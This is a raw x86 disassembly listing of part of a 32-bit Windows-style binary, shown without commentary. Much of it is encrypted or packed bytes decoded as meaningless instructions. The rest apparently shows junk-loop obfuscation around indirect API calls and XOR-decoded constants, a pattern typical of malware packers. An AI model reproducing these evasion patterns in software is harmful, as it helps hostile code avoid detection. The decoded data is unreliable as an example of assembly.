  40ecea:	xor    DWORD PTR [edi-0x4f],0xffffff8d
  40ecee:	cmp    al,0xd
  40ecf0:	dec    eax
  40ecf1:	lahf   
  40ecf2:	jae    0x40ecc3
  40ecf4:	js     0x40ecb8
  40ecf6:	fimul  WORD PTR [esi+0x374cc1fa]
  40ecfc:	mov    ds,edx
  40ecfe:	into   
  40ecff:	or     al,0xb9
  40ed01:	jecxz  0x40ecb9
  40ed03:	rol    BYTE PTR [esi+0x509a1938],cl
  40ed09:	icebp  
  40ed0a:	imul   edx,DWORD PTR [eax+0x5d],0xad701581
  40ed11:	xor    edi,DWORD PTR [esp+eax*1-0x49]
  40ed15:	bound  edx,QWORD PTR [eax]
  40ed17:	or     bl,0x94
  40ed1a:	cs jnp 0x40ed0d
  40ed1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed1e:	sti    
  40ed1f:	mov    al,ds:0x2fd0db9a
  40ed24:	test   eax,0xb7fc14a0
  40ed29:	retf   0x18b8
  40ed2c:	loop   0x40ed0c
  40ed2e:	dec    eax
  40ed2f:	and    DWORD PTR [ecx+0x69],esi
  40ed32:	icebp  
  40ed33:	mov    dl,0xfe
  40ed35:	and    al,0xd7
  40ed37:	repz mov edi,0xaaeaa729
  40ed3d:	clc    
  40ed3e:	mov    DWORD PTR [edx],0x4a84b28
  40ed44:	push   ds
  40ed45:	cli    
  40ed46:	pop    esp
  40ed47:	les    ebx,FWORD PTR [esi+0x44]
  40ed4a:	push   ebp
  40ed4b:	push   cs
  40ed4c:	mov    ebx,0x1cd911c7
  40ed51:	les    eax,FWORD PTR [eax]
  40ed53:	outs   dx,BYTE PTR ds:[esi]
  40ed54:	cmc    
  40ed55:	test   BYTE PTR [ebp+0x427f4bf0],ch
  40ed5b:	cs mov edx,0x922b4593
  40ed61:	cmp    al,0x74
  40ed63:	inc    esp
  40ed64:	rol    DWORD PTR [esi+eax*1-0x70c0f85c],1
  40ed6b:	xor    esi,DWORD PTR [ecx]
  40ed6d:	xchg   ebx,eax
  40ed6e:	adc    cl,dh
  40ed70:	call   0x4745d51
  40ed75:	pop    ebx
  40ed76:	push   esp
  40ed77:	jae    0x40ed6f
  40ed79:	and    eax,0xecb932c8
  40ed7e:	sub    BYTE PTR [ebp+0x69c76794],cl
  40ed84:	sbb    al,0xac
  40ed86:	mov    WORD PTR [edx+edx*2],ss
  40ed89:	sbb    dl,BYTE PTR [eax]
  40ed8b:	out    dx,eax
  40ed8c:	std    
  40ed8d:	and    DWORD PTR [ecx+eax*4-0x1c],esi
  40ed91:	aaa    
  40ed92:	cld    
  40ed93:	jl     0x40edb6
  40ed95:	sub    al,0xf7
  40ed97:	or     cl,BYTE PTR [edx]
  40ed99:	sub    BYTE PTR ds:0x5d60440b,al
  40ed9f:	and    ecx,DWORD PTR [edi-0x606eb7a6]
  40eda5:	into   
  40eda6:	mov    al,ds:0xe23bafb0
  40edab:	sub    dl,BYTE PTR [edx]
  40edad:	pop    es
  40edae:	adc    eax,0x5f119569
  40edb3:	(bad)  
  40edb4:	dec    edi
  40edb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb6:	lods   eax,DWORD PTR ds:[esi]
  40edb7:	mov    eax,0xe6ff30c5
  40edbc:	mov    al,ds:0x7ffcac6d
  40edc1:	dec    edi
  40edc2:	mov    DWORD PTR [edx+0x4ab6689d],ebx
  40edc8:	shl    BYTE PTR [eax-0x1c],0x3f
  40edcc:	mov    dh,0xb0
  40edce:	push   ebp
  40edcf:	xor    eax,0xe08356dc
  40edd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd5:	test   BYTE PTR [eax+0x553e13bb],bh
  40eddb:	jo     0x40edcf
  40eddd:	fcmovbe st,st(0)
  40eddf:	push   cs
  40ede0:	mov    bl,0x41
  40ede2:	rcr    DWORD PTR [esi-0x4ccba0ef],0x8d
  40ede9:	lds    esp,FWORD PTR [ebx-0x72273872]
  40edef:	mov    ecx,DWORD PTR [edi+0x7e0528ec]
  40edf5:	fmul   QWORD PTR ds:[ecx+0x6647d459]
  40edfc:	dec    esp
  40edfd:	mov    ds:0x86d50ed2,al
  40ee02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee03:	pop    edi
  40ee04:	or     DWORD PTR [eax],edi
  40ee06:	call   0x4d17:0x658309b
  40ee0d:	mov    DWORD PTR [esi],edx
  40ee0f:	pop    ecx
  40ee10:	fist   WORD PTR [eax-0x444d57c9]
  40ee16:	pushf  
  40ee17:	repnz add al,0xc5
  40ee1a:	pop    eax
  40ee1b:	jnp    0x40edd0
  40ee1d:	enter  0xfe97,0x7e
  40ee21:	shr    BYTE PTR [ebp+0x46a081d],cl
  40ee27:	(bad)  [eax]
  40ee29:	sub    BYTE PTR [ecx],0x32
  40ee2c:	jmp    0x40edd4
  40ee2e:	jno    0x40edbb
  40ee30:	and    dh,BYTE PTR [ebp-0x3e]
  40ee33:	xor    eax,0xe021cfa8
  40ee38:	mov    al,0x50
  40ee3a:	out    dx,eax
  40ee3b:	das    
  40ee3c:	sbb    al,BYTE PTR [esi+0x5ef09534]
  40ee42:	or     BYTE PTR [ebp+0x6d],dh
  40ee45:	sbb    eax,0xc6dd7d37
  40ee4a:	mov    ss,WORD PTR [edx]
  40ee4c:	xchg   edx,eax
  40ee4d:	ja     0x40eeba
  40ee4f:	mov    bh,bh
  40ee51:	sub    ch,BYTE PTR [edi+0x54624d41]
  40ee57:	jmp    0xcdb8:0x961821d1
  40ee5e:	out    dx,eax
  40ee5f:	pop    edx
  40ee60:	pop    eax
  40ee61:	into   
  40ee62:	dec    esp
  40ee63:	in     eax,dx
  40ee64:	sar    DWORD PTR [esi-0x7c0b2bfb],cl
  40ee6a:	aam    0xe5
  40ee6c:	sub    eax,0xbe70de75
  40ee71:	mov    esi,0x22e2ef33
  40ee76:	ss push esp
  40ee78:	ret    0x43d4
  40ee7b:	jne    0x40ee9a
  40ee7d:	or     edi,0xffffff8e
  40ee80:	add    BYTE PTR [edi+0x7c],ah
  40ee83:	inc    ebp
  40ee84:	push   esi
  40ee85:	xor    eax,0x89983a21
  40ee8a:	dec    edi
  40ee8b:	and    BYTE PTR [edi-0x4e],cl
  40ee8e:	ins    BYTE PTR es:[edi],dx
  40ee8f:	push   esp
  40ee90:	test   DWORD PTR [ecx+0x5a4610e9],0xd1155e31
  40ee9a:	cld    
  40ee9b:	dec    edi
  40ee9c:	dec    eax
  40ee9d:	sub    BYTE PTR [esi+0x27],0x96
  40eea1:	mov    ebp,0xdfaf1c3c
  40eea6:	leave  
  40eea7:	jbe    0x40eec6
  40eea9:	xor    al,0xf2
  40eeab:	mov    ebx,0x2462d160
  40eeb0:	push   esi
  40eeb1:	mov    ecx,0x8296119d
  40eeb6:	sti    
  40eeb7:	call   0x538c:0xeeadceec
  40eebe:	inc    esp
  40eebf:	(bad)  
  40eec1:	retf   
  40eec2:	pop    edi
  40eec3:	add    eax,0xc2e2a80b
  40eec8:	xchg   ecx,eax
  40eec9:	loop   0x40eea0
  40eecb:	mov    al,0xf8
  40eecd:	cmp    dl,dl
  40eecf:	test   DWORD PTR [edx-0x2a31bcc2],esp
  40eed5:	pop    esi
  40eed6:	sbb    al,0x37
  40eed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eed9:	(bad)  
  40eeda:	cld    
  40eedb:	pop    esp
  40eedc:	ja     0x40eef8
  40eede:	aam    0x2f
  40eee0:	out    dx,al
  40eee1:	daa    
  40eee2:	adc    edi,esp
  40eee4:	pop    eax
  40eee5:	xor    al,0xa3
  40eee7:	shr    BYTE PTR [ebx+ebx*2-0x5f],0x94
  40eeec:	icebp  
  40eeed:	cwde   
  40eeee:	pop    ebx
  40eeef:	(bad)  
  40eef0:	out    dx,eax
  40eef1:	sbb    esi,DWORD PTR [ebx+0x7adb347f]
  40eef7:	fld    DWORD PTR [eax+0x554476e9]
  40eefd:	call   0x3048:0x3ce17d1d
  40ef04:	shl    DWORD PTR [ebx+eiz*4+0x470cb7c7],0x8
  40ef0c:	bound  esp,QWORD PTR [edx]
  40ef0e:	mov    ?,eax
  40ef10:	stc    
  40ef11:	les    edx,FWORD PTR [edi+edi*8+0x5ed489a8]
  40ef18:	dec    ebx
  40ef19:	cdq    
  40ef1a:	mov    esi,0x69ae2b14
  40ef1f:	push   0x23ef69c1
  40ef24:	rcr    BYTE PTR [edi-0x6b],1
  40ef27:	cmp    BYTE PTR [edx+0x10defdcd],dl
  40ef2d:	mov    bl,bh
  40ef2f:	jmp    0x88b5:0xc0899ee4
  40ef36:	mov    edx,0xb3f80d2d
  40ef3b:	add    BYTE PTR [esp+esi*4+0x22204242],cl
  40ef42:	xor    BYTE PTR [ecx+0x74],al
  40ef45:	or     BYTE PTR [edi],al
  40ef47:	sbb    DWORD PTR [edi+eiz*2],esp
  40ef4a:	inc    dx
  40ef4c:	pusha  
  40ef4d:	rcr    DWORD PTR [edx+0x1],1
  40ef50:	ins    BYTE PTR es:[edi],dx
  40ef51:	stos   DWORD PTR es:[edi],eax
  40ef52:	pusha  
  40ef53:	lods   al,BYTE PTR ds:[esi]
  40ef54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef55:	jge    0x40ef44
  40ef57:	test   DWORD PTR [edi],eax
  40ef59:	adc    esp,DWORD PTR [eax]
  40ef5b:	out    0xcd,eax
  40ef5d:	iret   
  40ef5e:	jns    0x40ef7d
  40ef60:	js     0x40efd4
  40ef62:	cmp    ecx,DWORD PTR [ebp-0x58]
  40ef65:	leave  
  40ef66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef67:	sbb    bl,al
  40ef69:	xchg   esp,eax
  40ef6a:	and    al,0xcf
  40ef6c:	pusha  
  40ef6d:	leave  
  40ef6e:	ins    BYTE PTR es:[edi],dx
  40ef6f:	push   edx
  40ef70:	sub    DWORD PTR [eax+0x65437766],edx
  40ef76:	mov    ah,BYTE PTR [ecx+0x4d]
  40ef79:	mov    al,0x39
  40ef7b:	mov    ecx,0xbb53cea7
  40ef80:	mov    edi,0x6117b171
  40ef85:	popf   
  40ef86:	mov    WORD PTR [edx],cs
  40ef88:	aas    
  40ef89:	xor    ecx,eax
  40ef8b:	or     ah,bh
  40ef8d:	aas    
  40ef8e:	ja     0x40ef6d
  40ef90:	rcr    BYTE PTR [ebx],1
  40ef92:	fisubr DWORD PTR [ebx-0x72af08f5]
  40ef98:	sbb    ecx,DWORD PTR [ecx+0x486df830]
  40ef9e:	add    edx,DWORD PTR [edx]
  40efa0:	push   0x7b2b57a0
  40efa5:	outs   dx,BYTE PTR ds:[esi]
  40efa6:	int3   
  40efa7:	dec    esi
  40efa8:	mov    bh,0x78
  40efaa:	rcr    DWORD PTR [esi+0x1d],cl
  40efad:	icebp  
  40efae:	mov    edi,0x8a820522
  40efb3:	inc    ebp
  40efb4:	inc    DWORD PTR [ecx+0x42901825]
  40efba:	add    BYTE PTR [eax],al
  40efbc:	add    BYTE PTR [eax],al
  40efbe:	add    BYTE PTR [ebx],dh
  40efc0:	leave  
  40efc1:	or     ecx,DWORD PTR ds:0x429018
  40efc7:	inc    ecx
  40efc8:	mov    DWORD PTR ds:0x429018,ecx
  40efce:	cmp    DWORD PTR ds:0x429018,0xa
  40efd5:	jne    0x40efe1
  40efdb:	call   DWORD PTR ds:0x42e9b3
  40efe1:	cmp    DWORD PTR ds:0x429018,0x9
  40efe8:	jne    0x40effb
  40efee:	mov    ecx,DWORD PTR ds:0x429018
  40eff4:	inc    ecx
  40eff5:	mov    DWORD PTR ds:0x429018,ecx
  40effb:	cmp    DWORD PTR ds:0x429018,0x1e
  40f002:	jb     0x40efbf
  40f008:	sub    DWORD PTR ds:0x42c014,ecx
  40f00e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f011:	xor    al,0x73
  40f013:	sub    al,0x9
  40f015:	mov    DWORD PTR ds:0x42b000,0xef4
  40f01f:	mov    BYTE PTR [ecx],al
  40f021:	and    DWORD PTR ds:0x42b01c,0x42a004
  40f02b:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40f032:	sbb    DWORD PTR ds:0x429024,0xfd3
  40f03c:	push   ebx
  40f03d:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  40f044:	mov    ecx,DWORD PTR [ebp-0x18]
  40f047:	xor    eax,0x6376
  40f04c:	push   esi
  40f04d:	and    DWORD PTR ds:0x42c01c,0x0
  40f057:	jmp    0x40f06a
  40f05c:	xor    eax,eax
  40f05e:	add    eax,DWORD PTR ds:0x42c01c
  40f064:	inc    eax
  40f065:	mov    ds:0x42c01c,eax
  40f06a:	cmp    DWORD PTR ds:0x42c01c,0x16
  40f071:	jae    0x40f0bd
  40f077:	cmp    DWORD PTR ds:0x42c01c,0x4
  40f07e:	jne    0x40f0a0
  40f084:	push   DWORD PTR [ebp-0x24]
  40f087:	push   0x42901c
  40f08c:	push   DWORD PTR [ebp-0x18]
  40f08f:	push   DWORD PTR [ebp-0x14]
  40f092:	push   DWORD PTR [ebp-0x24]
  40f095:	push   0x236f
  40f09a:	call   DWORD PTR ds:0x42e9b7
  40f0a0:	cmp    DWORD PTR ds:0x42c01c,0x3
  40f0a7:	jne    0x40f0b8
  40f0ad:	mov    eax,ds:0x42c01c
  40f0b2:	inc    eax
  40f0b3:	mov    ds:0x42c01c,eax
  40f0b8:	jmp    0x40f05c
  40f0bd:	mov    eax,0x7510899
  40f0c2:	xor    ecx,eax
  40f0c4:	mov    esi,0x3272e0
  40f0c9:	adc    DWORD PTR ds:0x42a014,0x429010
  40f0d3:	push   edi
  40f0d4:	add    ecx,esi
  40f0d6:	jmp    0x40f0fa
  40f0db:	mov    DWORD PTR ds:0x42c014,0x1850
  40f0e5:	mov    dl,BYTE PTR [ebp-0x1]
  40f0e8:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f0ef:	mov    DWORD PTR ds:0x42a00c,0x213a
  40f0f9:	inc    ecx
  40f0fa:	mov    DWORD PTR ds:0x42b000,0x51ce
  40f104:	cmp    ecx,0x40
  40f107:	jb     0x40f0db
  40f10d:	mov    edx,DWORD PTR [ebp-0x18]
  40f110:	xor    edx,eax
  40f112:	add    edx,esi
  40f114:	mov    DWORD PTR ds:0x42c00c,0x7eb4
  40f11e:	jmp    0x40f1de
  40f123:	sub    DWORD PTR ds:0x42d018,edi
  40f129:	mov    edi,DWORD PTR [ebp+0x8]
  40f12c:	and    DWORD PTR ds:0x42d008,0x0
  40f136:	jmp    0x40f14a
  40f13b:	xor    ecx,ecx
  40f13d:	or     ecx,DWORD PTR ds:0x42d008
  40f143:	inc    ecx
  40f144:	mov    DWORD PTR ds:0x42d008,ecx
  40f14a:	cmp    DWORD PTR ds:0x42d008,0x18
  40f151:	jae    0x40f175
  40f157:	cmp    DWORD PTR ds:0x42d008,0x26
  40f15e:	jne    0x40f16a
  40f164:	call   DWORD PTR ds:0x42e9bb
  40f16a:	jmp    0x40f13b
  40f16f:	xor    DWORD PTR ds:0x42a00c,edx
  40f175:	mov    ecx,0x8a8c
  40f17a:	xor    DWORD PTR ds:0x42a004,0x50dc
  40f184:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f189:	mov    edi,0x3b50
  40f18e:	add    DWORD PTR ds:0x429008,0x42b008
  40f198:	add    cx,di
  40f19b:	xor    DWORD PTR ds:0x429018,0x2fa9
  40f1a5:	movzx  ecx,cx
  40f1a8:	mov    DWORD PTR [ebp-0xc],ecx
  40f1ab:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1ae:	add    DWORD PTR ds:0x42b000,0x4595
  40f1b8:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f1bc:	mov    DWORD PTR ds:0x42c010,0x3cf8
  40f1c6:	xor    ecx,0x8a8c
  40f1cc:	add    ecx,edi
  40f1ce:	mov    edi,0x13c
  40f1d3:	mov    edi,DWORD PTR [ebp-0xc]
  40f1d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40f1dd:	inc    edx
  40f1de:	mov    DWORD PTR ds:0x42c008,0x3284
  40f1e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1eb:	mov    DWORD PTR ds:0x42d00c,0x2d6d
  40f1f5:	cmp    edx,ecx
  40f1f7:	jne    0x40f123
  40f1fd:	xor    edi,DWORD PTR ds:0x42900c
  40f203:	mov    ecx,DWORD PTR [ebp-0x18]
  40f206:	and    DWORD PTR ds:0x429024,0x0
  40f210:	jmp    0x40f224
  40f215:	xor    edx,edx
  40f217:	or     edx,DWORD PTR ds:0x429024
  40f21d:	inc    edx
  40f21e:	mov    DWORD PTR ds:0x429024,edx
  40f224:	cmp    DWORD PTR ds:0x429024,0x10
  40f22b:	jae    0x40f27a
  40f231:	cmp    DWORD PTR ds:0x429024,0xa
  40f238:	jne    0x40f24f
  40f23e:	push   DWORD PTR [ebp-0x14]
  40f241:	push   0x42b018
  40f246:	push   DWORD PTR [ebp-0x14]
  40f249:	call   DWORD PTR ds:0x42e9bf
  40f24f:	cmp    DWORD PTR ds:0x429024,0x9
  40f256:	jne    0x40f26b
  40f25c:	xor    edx,edx
  40f25e:	xor    edx,DWORD PTR ds:0x429024
  40f264:	inc    edx
  40f265:	mov    DWORD PTR ds:0x429024,edx
  40f26b:	jmp    0x40f215
  40f270:	adc    DWORD PTR ds:0x42d00c,0x5b30
  40f27a:	mov    edx,DWORD PTR [ebp+0x10]
  40f27d:	xor    edi,0x523a
  40f283:	xor    ecx,eax
  40f285:	dec    DWORD PTR ds:0x42b010
  40f28b:	add    ecx,esi
  40f28d:	mov    DWORD PTR [edx],ecx
  40f28f:	sbb    DWORD PTR ds:0x42d004,0x42a008
  40f299:	mov    ecx,DWORD PTR [ebp-0x18]
  40f29c:	inc    edi
  40f29d:	xor    ecx,eax
  40f29f:	mov    edi,DWORD PTR ds:0x42a000
  40f2a5:	xor    DWORD PTR ds:0x42a004,edi
  40f2ab:	add    ecx,esi
  40f2ad:	mov    DWORD PTR ds:0x42d000,0x15
  40f2b7:	cmp    DWORD PTR ds:0x42d000,0x0
  40f2be:	je     0x40f2f6
  40f2c4:	cmp    DWORD PTR ds:0x42d000,0x1a
  40f2cb:	jne    0x40f2e4
  40f2d1:	push   0x42e111
  40f2d6:	push   0x42e0c7
  40f2db:	push   DWORD PTR [ebp-0x20]
  40f2de:	call   DWORD PTR ds:0x42e9c7
  40f2e4:	mov    edi,DWORD PTR ds:0x42d000
  40f2ea:	dec    edi
  40f2eb:	mov    DWORD PTR ds:0x42d000,edi
  40f2f1:	jmp    0x40f2b7
  40f2f6:	mov    DWORD PTR [ebp-0xc],ecx
  40f2f9:	not    edi
  40f2fb:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  40f302:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  40f309:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  40f310:	and    DWORD PTR ds:0x42b010,ecx
  40f316:	mov    ecx,DWORD PTR [ebp-0x14]
  40f319:	mov    DWORD PTR ds:0x42b018,0x1d
  40f323:	cmp    DWORD PTR ds:0x42b018,0x0
  40f32a:	je     0x40f37c
  40f330:	cmp    DWORD PTR ds:0x42b018,0xc
  40f337:	jne    0x40f348
  40f33d:	push   0x42e0d9
  40f342:	call   DWORD PTR ds:0x42e9cb
  40f348:	cmp    DWORD PTR ds:0x42b018,0xd
  40f34f:	jne    0x40f362
  40f355:	mov    edi,DWORD PTR ds:0x42b018
  40f35b:	dec    edi
  40f35c:	mov    DWORD PTR ds:0x42b018,edi
  40f362:	xor    edi,edi
  40f364:	xor    edi,DWORD PTR ds:0x42b018
  40f36a:	dec    edi
  40f36b:	mov    DWORD PTR ds:0x42b018,edi
  40f371:	jmp    0x40f323
  40f376:	not    DWORD PTR ds:0x42d018
  40f37c:	mov    DWORD PTR [ebp+0x8],ecx
  40f37f:	sub    edi,ecx
  40f381:	mov    ecx,DWORD PTR [ebp+0x8]
  40f384:	and    DWORD PTR ds:0x42a010,0x408f
  40f38e:	xor    ecx,eax
  40f390:	add    ecx,esi
  40f392:	mov    ecx,0x242ebed
  40f397:	not    edi
  40f399:	mov    edi,0xf641bea
  40f39e:	je     0x418714
  40f3a4:	mov    edx,DWORD PTR [ebp+0x8]
  40f3a7:	or     DWORD PTR ds:0x429008,0x3119
  40f3b1:	mov    ebx,DWORD PTR [ebp-0x8]
  40f3b4:	adc    DWORD PTR ds:0x42a018,0x42c014
  40f3be:	xor    edx,eax
  40f3c0:	xor    ebx,eax
  40f3c2:	sub    DWORD PTR ds:0x42c004,0x429010
  40f3cc:	sub    edx,ebx
  40f3ce:	sub    edx,esi
  40f3d0:	xor    edx,eax
  40f3d2:	mov    DWORD PTR [ebp+0x8],edx
  40f3d5:	inc    DWORD PTR ds:0x42b010
  40f3db:	mov    edx,DWORD PTR [ebp+0x8]
  40f3de:	mov    ebx,DWORD PTR [ebp-0x58]
  40f3e1:	add    edx,0x5708f8
  40f3e7:	sub    DWORD PTR ds:0x42c01c,0x72ca
  40f3f1:	imul   edx,ebx
  40f3f4:	xor    DWORD PTR ds:0x429024,edi
  40f3fa:	mov    DWORD PTR [ebp-0x58],edx
  40f3fd:	and    DWORD PTR ds:0x42d004,0x0
  40f407:	mov    ebx,DWORD PTR ds:0x42d004
  40f40d:	inc    ebx
  40f40e:	mov    DWORD PTR ds:0x42d004,ebx
  40f414:	cmp    DWORD PTR ds:0x42d004,0x1e
  40f41b:	jne    0x40f42c
  40f421:	push   0x42a004
  40f426:	call   DWORD PTR ds:0x42e9d3
  40f42c:	cmp    DWORD PTR ds:0x42d004,0x17
  40f433:	jb     0x40f407
  40f439:	mov    edx,DWORD PTR [ebp+0x8]
  40f43c:	mov    ebx,DWORD PTR [ebp-0x54]
  40f43f:	add    edx,0x64f8da
  40f445:	xor    DWORD PTR ds:0x42b004,0x42b000
  40f44f:	or     edx,ebx
  40f451:	adc    DWORD PTR ds:0x42c014,0x3307
  40f45b:	mov    DWORD PTR [ebp-0x54],edx
  40f45e:	add    DWORD PTR ds:0x42d004,0x3241
  40f468:	mov    edx,DWORD PTR [ebp+0x8]
  40f46b:	sub    DWORD PTR ds:0x42900c,0x6cc3
  40f475:	mov    ebx,DWORD PTR [ebp-0x50]
  40f478:	xor    DWORD PTR ds:0x42b014,0x42c01c
  40f482:	add    edx,ecx
  40f484:	adc    DWORD PTR ds:0x42c000,0x429028
  40f48e:	xor    edx,ebx
  40f490:	mov    DWORD PTR [ebp-0x50],edx
  40f493:	and    DWORD PTR ds:0x429018,0x0
  40f49d:	mov    ebx,DWORD PTR ds:0x429018
  40f4a3:	inc    ebx
  40f4a4:	mov    DWORD PTR ds:0x429018,ebx
  40f4aa:	cmp    DWORD PTR ds:0x429018,0x1f
  40f4b1:	jne    0x40f4cc
  40f4b7:	push   0x42c010
  40f4bc:	push   0x42c018
  40f4c1:	push   0x42a008
  40f4c6:	call   DWORD PTR ds:0x42e993
  40f4cc:	cmp    DWORD PTR ds:0x429018,0x1e
  40f4d3:	jb     0x40f49d
  40f4d9:	inc    edx
  40f4da:	mov    edx,DWORD PTR [ebp+0x8]
  40f4dd:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f4e0:	add    DWORD PTR ds:0x42d010,0x42d01c
  40f4ea:	add    edx,edi
  40f4ec:	adc    DWORD PTR ds:0x42d018,0x42b01c
  40f4f6:	and    edx,ebx
  40f4f8:	mov    DWORD PTR [ebp-0x4c],edx
  40f4fb:	or     edx,DWORD PTR ds:0x42b000
  40f501:	mov    edx,DWORD PTR [ebp+0x8]
  40f504:	mov    ebx,DWORD PTR ds:0x42d000
  40f50a:	sub    DWORD PTR ds:0x42a000,ebx
  40f510:	mov    ebx,DWORD PTR [ebp-0x48]
  40f513:	or     DWORD PTR ds:0x42c000,0x42c010
  40f51d:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f524:	mov    DWORD PTR [ebp-0x48],edx
  40f527:	mov    edx,DWORD PTR [ebp+0x8]
  40f52a:	mov    ebx,0xfa5e15e2
  40f52f:	inc    DWORD PTR ds:0x42d018
  40f535:	sub    ebx,edx
  40f537:	movzx  edx,WORD PTR ds:0x42c018
  40f53e:	adc    edx,DWORD PTR ds:0x429028
  40f544:	mov    DWORD PTR ds:0x42c018,edx
  40f54a:	add    ebx,DWORD PTR [ebp-0x44]
  40f54d:	mov    DWORD PTR [ebp-0x44],ebx
  40f550:	and    DWORD PTR ds:0x42b018,0x0
  40f55a:	jmp    0x40f56c
  40f55f:	mov    edx,DWORD PTR ds:0x42b018
  40f565:	inc    edx
  40f566:	mov    DWORD PTR ds:0x42b018,edx
  40f56c:	cmp    DWORD PTR ds:0x42b018,0x19
  40f573:	jae    0x40f616
  40f579:	cmp    DWORD PTR ds:0x42b018,0x6
  40f580:	jne    0x40f594
  40f586:	push   0x0
  40f588:	push   DWORD PTR [ebp-0x10]
  40f58b:	push   DWORD PTR [ebp-0x28]
  40f58e:	call   DWORD PTR ds:0x42e997
  40f594:	cmp    DWORD PTR ds:0x42b018,0x5
  40f59b:	jne    0x40f5ae
  40f5a1:	mov    edx,DWORD PTR ds:0x42b018
  40f5a7:	inc    edx
  40f5a8:	mov    DWORD PTR ds:0x42b018,edx
  40f5ae:	jmp    0x40f55f
  40f5b3:	mov    DWORD PTR ds:0x42b00c,0x18
  40f5bd:	cmp    DWORD PTR ds:0x42b00c,0x0
  40f5c4:	je     0x40f616
  40f5ca:	cmp    DWORD PTR ds:0x42b00c,0x1e
  40f5d1:	jne    0x40f5fa
  40f5d7:	push   0x3551
  40f5dc:	push   DWORD PTR [ebp-0x28]
  40f5df:	push   0x42c000
  40f5e4:	push   DWORD PTR [ebp-0x10]
  40f5e7:	push   0x1896
  40f5ec:	push   0x8105
  40f5f1:	push   DWORD PTR [ebp-0xc]
  40f5f4:	call   DWORD PTR ds:0x42e99f
  40f5fa:	mov    edx,DWORD PTR ds:0x42b00c
  40f600:	dec    edx
  40f601:	mov    DWORD PTR ds:0x42b00c,edx
  40f607:	jmp    0x40f5bd
  40f60c:	add    DWORD PTR ds:0x42d00c,0x25c6
  40f616:	mov    edx,DWORD PTR [ebp+0x8]
  40f619:	adc    DWORD PTR ds:0x42d018,0x42a00c
  40f623:	xor    edx,eax
  40f625:	adc    DWORD PTR ds:0x42b010,0x4589
  40f62f:	add    edx,esi
  40f631:	mov    DWORD PTR ds:0x42d014,0x3f58
  40f63b:	jne    0x40f3a4
  40f641:	jmp    0x418714
  40f646:	adc    edx,edx
  40f648:	mov    edx,DWORD PTR [ebp-0xc]
  40f64b:	sub    edx,esi
  40f64d:	xor    edx,eax
  40f64f:	mov    DWORD PTR [ebp-0x5c],edx
  40f652:	mov    edx,DWORD PTR [ebp-0x10]
  40f655:	mov    ebx,DWORD PTR [ebp-0x8]
  40f658:	xor    edx,eax
  40f65a:	xor    ebx,eax
  40f65c:	sub    edx,ebx
  40f65e:	sub    edx,esi
  40f660:	xor    edx,eax
  40f662:	mov    DWORD PTR [ebp-0x10],edx
  40f665:	mov    edx,DWORD PTR [ebp-0x14]
  40f668:	mov    DWORD PTR [ebp+0x8],edx
  40f66b:	jmp    0x411a66
  40f670:	mov    edx,DWORD PTR [ebp+0x8]
  40f673:	mov    ebx,DWORD PTR [ebp-0x8]
  40f676:	xor    edx,eax
  40f678:	xor    ebx,eax
  40f67a:	sub    edx,ebx
  40f67c:	sub    edx,esi
  40f67e:	xor    edx,eax
  40f680:	mov    DWORD PTR [ebp+0x8],edx
  40f683:	jmp    0x411a09
  40f688:	aaa    
  40f689:	xchg   BYTE PTR [edi-0x3a],cl
  40f68c:	jae    0x40f709
  40f68e:	mov    ebx,0xae43537b
  40f693:	xor    al,0xc4
  40f695:	xor    bl,BYTE PTR [edi+0x7aca87d3]
  40f69b:	jp     0x40f69e
  40f69d:	pop    edi
  40f69e:	jp     0x40f71a
  40f6a0:	push   eax
  40f6a1:	std    
  40f6a2:	mov    ds:0x8d4dc6cb,eax
  40f6a7:	push   eax
  40f6a8:	adc    al,0x2b
  40f6aa:	sbb    eax,0x84a6195b
  40f6af:	mov    ds:0x7735232,al
  40f6b4:	cmp    ebp,ebp
  40f6b6:	dec    esi
  40f6b7:	rcl    ch,cl
  40f6b9:	mov    al,ds:0xa9a1957e
  40f6be:	cdq    
  40f6bf:	stc    
  40f6c0:	outs   dx,BYTE PTR ds:[esi]
  40f6c1:	sbb    al,0x3f
  40f6c3:	je     0x40f657
  40f6c5:	xchg   esi,eax
  40f6c6:	push   edi
  40f6c7:	cmc    
  40f6c8:	mov    ch,0x3c
  40f6ca:	adc    BYTE PTR [ecx+0x55],dh
  40f6cd:	in     al,0xfa
  40f6cf:	add    esi,edx
  40f6d1:	and    ecx,DWORD PTR [edi+0x50]
  40f6d4:	test   eax,ecx
  40f6d6:	out    dx,eax
  40f6d7:	sub    ebx,DWORD PTR [ebp+ebx*4+0x669c8a21]
  40f6de:	retf   
  40f6df:	mov    DWORD PTR [ebp+edx*4+0x62],ecx
  40f6e3:	inc    ebx
  40f6e4:	lds    edi,FWORD PTR [ecx-0x5708b7a7]
  40f6ea:	lahf   
  40f6eb:	jle    0x40f693
  40f6ed:	out    dx,al
  40f6ee:	daa    
  40f6ef:	jae    0x40f72a
  40f6f1:	add    al,0x44
  40f6f3:	repz mov bh,0xb6
  40f6f6:	mov    ?,WORD PTR [edi-0x14]
  40f6f9:	pop    edi
  40f6fa:	je     0x40f69b
  40f6fc:	xchg   ebx,eax
  40f6fd:	ins    DWORD PTR es:[edi],dx
  40f6fe:	repz aam 0x1f
  40f701:	inc    esp
  40f702:	xlat   BYTE PTR ds:[ebx]
  40f703:	lock dec eax
  40f705:	mov    eax,0x4350a210
  40f70a:	(bad)  
